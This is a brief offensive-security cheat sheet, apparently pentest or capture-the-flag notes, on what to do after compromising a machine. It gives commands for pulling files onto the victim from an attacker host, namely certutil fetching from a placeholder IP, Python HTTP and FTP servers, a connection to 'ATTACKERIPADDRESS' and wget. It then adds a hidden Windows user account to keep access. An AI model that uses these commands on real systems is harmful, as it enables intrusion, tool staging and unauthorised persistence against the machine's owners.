# Tips while compromised

File Transfers:

Below are tools we can use to transfer files to the compromised machine.

- Certutil

```jsx
certutil.exe -urlcache -f http://IPADDRESS/file.txt file.txt
```

- HTTP

```jsx
python -m SimpleHTTPServer 80
```

- Browser

Navigate directly to file

- FTP

```jsx
python -m pyftpdlib 21 (attacker machine)
ftp ATTACKERIPADDRESS
```

- Linux

```jsx
wget
```

Maintaining Access:

- Add a user

```jsx
net user username password /add
```